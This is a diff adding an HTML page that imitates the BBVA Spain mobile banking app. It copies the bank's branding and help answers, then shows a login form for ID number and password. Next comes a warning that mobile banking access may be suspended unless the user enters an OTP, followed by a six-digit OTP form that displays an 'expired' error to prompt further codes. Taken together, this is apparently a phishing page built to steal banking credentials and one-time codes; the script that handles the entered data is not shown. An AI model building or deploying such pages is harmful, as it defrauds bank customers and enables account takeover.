@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BBVA</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="mobile-container">
+        <div class="phone-frame">
+            <div class="screen">
+                <!-- First screen with download.jpg -->
+                <div class="background-image first-screen"></div>
+                
+                <!-- Second screen with bg .png and content -->
+                <div class="background-image second-screen">
+                    <!-- Header -->
+                    <header class="header">
+                        <div class="logo">BBVA</div>
+                        <div class="header-icons">
+                            <div class="icon-item" id="help-button" onclick="openHelpScreen(event); return false;">
+                                <div class="icon-circle">!</div>
+                                <span class="icon-label" data-translate="help">Ayuda</span>
+                            </div>
+                            <div class="icon-item" id="menu-button" onclick="openMenuScreen(event); return false;">
+                                <div class="icon-menu"></div>
+                                <span class="icon-label" data-translate="menu">Menú</span>
+                            </div>
+                        </div>
+                    </header>
+
+                    <!-- Main Content -->
+                    <div class="content-wrapper">
+                        <!-- Main Card -->
+                        <div class="main-card">
+                            <h1 class="greeting" id="greeting" data-translate="greeting">Buenas tardes</h1>
+                            <button class="login-btn" id="activate-card-btn" onclick="handleActivateCardClick()" data-translate="activateCard">Activa tu tarjeta aquí</button>
+                            
+                            <p class="non-user-text" data-translate="activateCardText">Si ya tienes una cuenta, puedes activar tu tarjeta aquí</p>
+                        </div>
+                        
+                        <!-- Long White Box Section -->
+                        <div class="long-white-section">
+                            <h2 class="bottom-heading" data-translate="notCustomerYet">¿AÚN NO ERES CLIENTE DE BBVA?</h2>
+                            
+                            <!-- Lighter Box Section -->
+                            <div class="lighter-info-box">
+                                <h3 class="lighter-box-heading" data-translate="stillPayingFees">¿Sigues pagando comisiones por tu cuenta?</h3>
+                                <p class="lighter-box-text" data-translate="discoverOptions">Descubre todas las opciones que tenemos para ti y elige la que mejor se adapte a tus necesidades.</p>
+                                <p class="more-info-text" data-translate="moreInformation">Más información</p>
+                            </div>
+                            
+                            <!-- Text Banner -->
+                            <p class="preference-text" data-translate="preferenceText">SI PREFIERES, PUEDES<br>CONOCERNOS POCO A POCO</p>
+                            
+                            <!-- Picture and App Trial Box -->
+                            <div class="app-trial-box">
+                                <!-- Picture -->
+                                <div class="promo-image-placeholder">
+                                    <img src="pic 1.jpg" alt="BBVA Promotional" class="promo-image">
+                                </div>
+                                
+                                <!-- App Trial Section -->
+                                <div class="app-trial-section">
+                                    <h2 class="trial-heading" data-translate="tryApp">Prueba la app de BBVA sin ser cliente</h2>
+                                    <p class="trial-text" data-translate="trialText">Podrás usar las principales funciones de la app para tus necesidades diarias, como reservar una cita, añadir bancos o calcular el valor de una vivienda. Inicia sesión en dos pasos, sin compromiso.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Help Screen -->
+                <div class="help-overlay" id="help-overlay">
+                    <div class="help-screen">
+                        <div class="help-header">
+                            <h2 class="help-title" data-translate="help">Ayuda</h2>
+                            <div class="help-language-toggle" onclick="toggleLanguage()">
+                                <span id="language-display">ES</span>
+                            </div>
+                            <div class="help-close-wrapper">
+                                <button class="help-close" id="help-close" onclick="closeHelpScreen()">×</button>
+                                <span class="help-close-label" data-translate="close">Cerrar</span>
+                            </div>
+                        </div>
+                        <div class="help-content">
+                            <div class="help-questions" id="help-questions">
+                                <div class="help-question-item">
+                                    <div class="help-question-header" onclick="toggleQuestion(this)">
+                                        <span class="help-question-text">¿Qué puedo hacer si tengo problemas para iniciar sesión en la app de BBVA?</span>
+                                        <span class="help-question-icon">+</span>
+                                    </div>
+                                    <div class="help-question-answer">
+                                        <p>Si nuestra app no funciona correctamente, intenta realizar una de las siguientes acciones:</p>
+                                        <ul>
+                                            <li>Forzar el cierre de la app (normalmente en Configuración > Aplicaciones > BBVA España > Forzar cierre).</li>
+                                            <li>Limpiar la caché y los datos de la aplicación (También en Configuración > Aplicaciones > BBVA España).</li>
+                                            <li>Si hay actualizaciones disponibles, instálalas. En este proceso, recuerda reiniciar tu teléfono después de las actualizaciones.</li>
+                                            <li>Toca "Cambiar usuario" en la pantalla de la app BBVA ES.</li>
+                                            <li>Desinstala la app e instálala de nuevo.</li>
+                                        </ul>
+                                        <p>Una vez realizados los pasos anteriores, apaga el teléfono durante un minuto, vuelve a encenderlo e intenta iniciar sesión de nuevo.</p>
+                                    </div>
+                                </div>
+                                <div class="help-question-item">
+                                    <div class="help-question-header" onclick="toggleQuestion(this)">
+                                        <span class="help-question-text">¿Qué puedo hacer si mi acceso está temporalmente bloqueado?</span>
+                                        <span class="help-question-icon">+</span>
+                                    </div>
+                                    <div class="help-question-answer">
+                                        <p>Si tu acceso está temporalmente bloqueado, contacta con el Servicio de Atención al Cliente de BBVA. Te ayudarán a desbloquear tu cuenta y restaurar el acceso a tus servicios online.</p>
+                                    </div>
+                                </div>
+                                <div class="help-question-item">
+                                    <div class="help-question-header" onclick="toggleQuestion(this)">
+                                        <span class="help-question-text">¿Cómo puedo recuperar o cambiar mi contraseña de acceso?</span>
+                                        <span class="help-question-icon">+</span>
+                                    </div>
+                                    <div class="help-question-answer">
+                                        <p>En cualquier caso, necesitarás identificarte con un documento de identidad y crear una nueva contraseña, que debe ser única y tener entre 4 y 6 caracteres, combinando números y letras que distinguen entre mayúsculas y minúsculas. Ten a mano tu tarjeta BBVA y tu teléfono móvil; si no tienes tu tarjeta, llama al Servicio de Atención al Cliente.</p>
+                                        
+                                        <h4>Para recuperar tu contraseña:</h4>
+                                        
+                                        <h5>Desde la app de BBVA:</h5>
+                                        <ul>
+                                            <li>Selecciona "¿Has olvidado tu contraseña de acceso?" en la pantalla de inicio.</li>
+                                        </ul>
+                                        
+                                        <h5>Desde la web de BBVA:</h5>
+                                        <ul>
+                                            <li>Ve a iniciar sesión y selecciona "¿Has olvidado tu contraseña de acceso?"</li>
+                                        </ul>
+                                        
+                                        <h4>Para cambiar tu contraseña:</h4>
+                                        
+                                        <h5>Desde la app de BBVA:</h5>
+                                        <ul>
+                                            <li>Ve a Menú > Seguridad > Métodos de acceso > Contraseña</li>
+                                        </ul>
+                                        
+                                        <h5>Desde la web de BBVA:</h5>
+                                        <ul>
+                                            <li>Selecciona Mi Perfil > Seguridad > Contraseña de acceso > Modificar</li>
+                                        </ul>
+                                    </div>
+                                </div>
+                                <div class="help-question-item">
+                                    <div class="help-question-header" onclick="toggleQuestion(this)">
+                                        <span class="help-question-text">¿Cómo accedo a mi cuenta online de BBVA o creo una contraseña de acceso?</span>
+                                        <span class="help-question-icon">+</span>
+                                    </div>
+                                    <div class="help-question-answer">
+                                        <p>Lo primero que necesitas para acceder a tu cuenta online es crear una contraseña de acceso. La contraseña de acceso es una combinación única de 4 a 6 caracteres, formada por números y letras que distinguen entre mayúsculas y minúsculas, que te permite usar de forma segura todos los servicios online de BBVA.</p>
+                                        
+                                        <p>Tienes dos formas de crear la contraseña; necesitarás un documento de identidad y la información de una de tus tarjetas BBVA.</p>
+                                        
+                                        <h5>Desde la app de BBVA:</h5>
+                                        <ul>
+                                            <li>Descarga la app de BBVA.</li>
+                                            <li>Selecciona Crear contraseña de acceso y sigue los pasos que se muestran.</li>
+                                        </ul>
+                                        
+                                        <h5>Desde la web de BBVA:</h5>
+                                        <ul>
+                                            <li>En el menú superior, selecciona Acceso.</li>
+                                            <li>Selecciona Crea tu contraseña y sigue los pasos que se muestran.</li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Login Modal -->
+                <div class="login-modal-overlay" id="login-modal-overlay">
+                    <div class="login-modal">
+                        <div class="login-modal-drag-handle"></div>
+                        <div class="login-modal-header">
+                            <h2 class="login-modal-title" data-translate="login">Iniciar sesión</h2>
+                            <div class="login-modal-actions">
+                                <div class="login-help-icon" onclick="openHelpFromLogin(event); return false;">
+                                    <div class="login-icon-circle">!</div>
+                                    <span class="login-icon-label" data-translate="help">Ayuda</span>
+                                </div>
+                                <div class="login-close-icon" onclick="closeLoginModal(); return false;">
+                                    <div class="login-icon-circle">×</div>
+                                    <span class="login-icon-label" data-translate="close">Cerrar</span>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="login-modal-content">
+                            <input type="text" class="login-input" data-translate="loginIdPlaceholder" placeholder="NIF, NIE, DNI o Pasaporte" id="login-id">
+                            <div class="login-password-wrapper">
+                                <input type="password" class="login-input" data-translate="loginPasswordPlaceholder" placeholder="Contraseña de acceso" id="login-password">
+                                <span class="login-password-toggle" onclick="togglePasswordVisibility()">👁</span>
+                            </div>
+                            <button class="login-submit-btn" id="login-submit-btn" onclick="handleLogin()" data-translate="login">Iniciar sesión</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Loading Screen -->
+                <div class="loading-overlay" id="loading-overlay">
+                    <div class="loading-content">
+                        <div class="loading-spinner"></div>
+                    </div>
+                </div>
+                
+                <!-- Verification Screen -->
+                <div class="verification-overlay" id="verification-overlay">
+                    <div class="verification-screen">
+                        <div class="verification-header">
+                            <h2 class="verification-title" data-translate="otpVerificationRequired">Verificación OTP Requerida</h2>
+                        </div>
+                        <div class="verification-content">
+                            <div class="verification-icon">⚠</div>
+                            <h3 class="verification-heading" data-translate="verifyOTP">Verificar OTP</h3>
+                            <div class="verification-text">
+                                <p data-translate="securityMessage1">Por tu seguridad, esta verificación debe completarse.</p>
+                                <p data-translate="securityMessage2">Si no finalizas el proceso, tu acceso a la banca móvil puede suspenderse temporalmente.</p>
+                                <p data-translate="securityMessage3">Por favor, haz clic en "Entiendo", introduce el OTP y completa la verificación para continuar usando tu cuenta sin interrupciones.</p>
+                                <p data-translate="thankYou">Gracias.</p>
+                            </div>
+                            <button class="verification-understand-btn" onclick="showOTPVerificationScreen()" data-translate="iUnderstand">Entiendo</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- OTP Verification Screen -->
+                <div class="otp-verification-overlay" id="otp-verification-overlay">
+                    <div class="otp-verification-screen">
+                        <div class="otp-verification-header">
+                            <h2 class="otp-verification-title" data-translate="otpVerificationRequired">Verificación OTP Requerida</h2>
+                        </div>
+                        <div class="otp-verification-content">
+                            <div class="otp-logo">BBVA</div>
+                            <p class="otp-message" data-translate="otpSent">El OTP ha sido enviado al número de móvil registrado</p>
+                            <div class="otp-input-container">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="otp-1" oninput="handleOTPInput(this, 'otp-2')" onkeydown="handleOTPBackspace(event, 'otp-1')">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="otp-2" oninput="handleOTPInput(this, 'otp-3')" onkeydown="handleOTPBackspace(event, 'otp-2', 'otp-1')">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="otp-3" oninput="handleOTPInput(this, 'otp-4')" onkeydown="handleOTPBackspace(event, 'otp-3', 'otp-2')">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="otp-4" oninput="handleOTPInput(this, 'otp-5')" onkeydown="handleOTPBackspace(event, 'otp-4', 'otp-3')">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="otp-5" oninput="handleOTPInput(this, 'otp-6')" onkeydown="handleOTPBackspace(event, 'otp-5', 'otp-4')">
+                                <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric" id="otp-6" onkeydown="handleOTPBackspace(event, 'otp-6', 'otp-5')">
+                            </div>
+                            <div class="otp-error-message" id="otp-error-message" style="display: none;" data-translate="otpExpired">
+                                ¡OTP expirado, introduce un nuevo OTP!
+                            </div>
+                            <button class="otp-submit-btn" onclick="submitOTP()" data-translate="submitOTP">Enviar OTP</button>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- Menu Sidebar -->
+                <div class="menu-overlay" id="menu-overlay">
+                    <div class="menu-sidebar">
+                        <div class="menu-header">
+                            <h2 class="menu-title" data-translate="menu">Menú</h2>
+                            <button class="menu-close" onclick="closeMenuSidebar()">×</button>
+                        </div>
+                        <div class="menu-content">
+                            <div class="menu-language-section">
+                                <h3 class="menu-language-title" id="menu-language-title">Idioma / Language</h3>
+                                <div class="menu-language-buttons">
+                                    <button class="menu-lang-btn" id="menu-lang-es" onclick="changeLanguage('es')">Español</button>
+                                    <button class="menu-lang-btn" id="menu-lang-en" onclick="changeLanguage('en')">English</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
